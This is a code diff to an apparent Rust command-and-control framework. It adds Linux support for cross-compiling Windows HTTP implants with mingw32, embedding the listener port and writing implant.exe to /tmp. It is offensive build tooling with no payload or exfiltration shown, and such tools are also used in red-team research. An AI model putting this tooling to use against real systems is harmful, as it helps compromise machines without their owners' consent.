@@ -70,6 +70,50 @@ fn compile_msbuild_project(
     return false;
 }
 
+#[cfg(target_os = "linux")]
+fn compile_mingw32_project(
+    http_listener: HTTPListener,
+    main_file_path: PathBuf,
+    output_directory_path: PathBuf,
+) -> bool {
+    let output_directory_path_str_option = output_directory_path.to_str();
+    if output_directory_path_str_option.is_none() {
+        return false;
+    }
+
+    match main_file_path.as_path().to_str() {
+        Some(implant_project_path_str) => {
+            match Command::new("/usr/bin/x86_64-w64-mingw32-gcc")
+                .stdout(Stdio::null())
+                .stderr(Stdio::null())
+                .arg("-o")
+                .arg(format!(
+                    "{}implant.exe",
+                    output_directory_path_str_option.unwrap()
+                ))
+                .arg(implant_project_path_str)
+                .arg("-static")
+                .arg("-lws2_32")
+                .arg("-lstdc++")
+                .arg("-D_DEBUG")
+                .arg(format!("-DHTTP_PORT={}", http_listener.port))
+                .status()
+            {
+                Ok(_) => {
+                    println!("[+] Successfully compiled the implant project with mingw32");
+                    return true;
+                }
+                Err(_) => {
+                    println!("[!] Failed to generate the implant");
+                }
+            }
+        }
+        None => {}
+    }
+
+    return false;
+}
+
 #[cfg(target_os = "windows")]
 pub fn generate_http_implant(http_listener: HTTPListener, implant_project_name: &str) -> bool {
     if CONFIG.binaries.vcvarsall.is_empty() {
@@ -152,6 +196,8 @@ pub fn generate_http_implant(http_listener: HTTPListener, implant_project_name: 
 
 #[cfg(target_os = "linux")]
 pub fn generate_http_implant(http_listener: HTTPListener, implant_project_name: &str) -> bool {
+    use std::str::FromStr;
+
     let flag: bool = false;
 
     println!(
@@ -159,14 +205,81 @@ pub fn generate_http_implant(http_listener: HTTPListener, implant_project_name: 
         http_listener.port
     );
 
-    match std::env::current_exe() {
-        Ok(current_path) => {
-            println!("[+] Current path: {}", current_path.display());
-        }
+    let tmp_result = PathBuf::from_str("/tmp/");
+    let tmp_out_dir: PathBuf;
+    match tmp_result
+    {
+        Ok(v) => {
+            tmp_out_dir = v;
+        },
         Err(_) => {
-            println!("[!] Couldn't get the current path of the executable");
+            return flag
         }
     }
+
+    let current_path_result: Result<PathBuf, std::io::Error> = std::env::current_exe();
+    if current_path_result.is_err() {
+        println!("[!] Couldn't get the current path of the executable");
+        return false;
+    }
+
+    let current_path: PathBuf = current_path_result.unwrap();
+    let mut current_path_ancestors: Ancestors = current_path.ancestors();
+
+    // climb up from the /code/target/release/rusty_c2.exe to /code/
+    current_path_ancestors.next();
+    current_path_ancestors.next();
+    current_path_ancestors.next();
+
+    let implant_project_path: Option<&Path> = current_path_ancestors.next();
+
+    if implant_project_path.is_none() {
+        println!("[!] Couldn't find the path of the implant projects");
+        return false;
+    }
+
+    match std::fs::read_dir(implant_project_path.unwrap().join("implants").join("http")) {
+        Ok(implant_projects_dir) => {
+            for entry_result in implant_projects_dir {
+                match entry_result {
+                    Ok(entry) => match entry.file_type() {
+                        Ok(entry_file_type) => {
+                            if entry_file_type.is_dir() {
+                                if entry.file_name().to_ascii_lowercase() == implant_project_name {
+                                    println!("[+] Found implant project: {}", implant_project_name);
+                                    match entry.path().to_str() {
+                                        Some(implant_project_path) => {
+                                            println!(
+                                                "[+] Found path of the implant project: {}",
+                                                implant_project_path
+                                            );
+
+                                            compile_mingw32_project(
+                                                http_listener,
+                                                entry.path().join("main.cpp"),
+                                                tmp_out_dir,
+                                            );
+                                            return true;
+                                        }
+                                        None => {
+                                            println!("[!] Couldn't find the path of the implant projects");
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                        Err(_) => {}
+                    },
+                    Err(_) => {}
+                }
+            }
+
+            println!("[!] Couldn't find the implant project");
+        }
+        Err(_) => {
+            println!("[!] Couldn't list the implant projects");
+        }
+    };
 
     return flag;
 }
